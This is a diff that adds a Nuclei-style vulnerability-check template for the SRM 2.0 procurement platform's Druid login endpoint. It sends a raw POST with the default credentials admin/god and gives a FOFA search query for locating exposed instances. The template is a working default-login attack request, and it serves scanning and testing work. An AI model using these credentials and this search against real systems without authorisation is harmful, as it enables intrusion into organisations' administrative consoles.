@@ -1,0 +1,38 @@
+id: poc-hf2hxnzomdreagcm
+info:
+  name: SRM智联云采系统 submitlogin 弱口令
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hf2hxnzomdreagcm'
+  tags: default-login,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hf2hxnzomdreagcm
+    fofa: title=="SRM 2.0"
+http:
+- raw:
+  - 'POST /adpweb/druid/submitLogin HTTP/1.1
+
+    Accept:text/plain, */*; q=0.01
+
+    Accept-Encoding:gzip, deflate, br
+
+    Accept-Language:zh-CN,zh;q=0.9
+
+    Connection:close
+
+    Content-Length:37
+
+    Content-Type:application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.155 Safari/537.36
+
+    X-Requested-With:XMLHttpRequest
+
+
+    loginUsername=admin&loginPassword=god'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
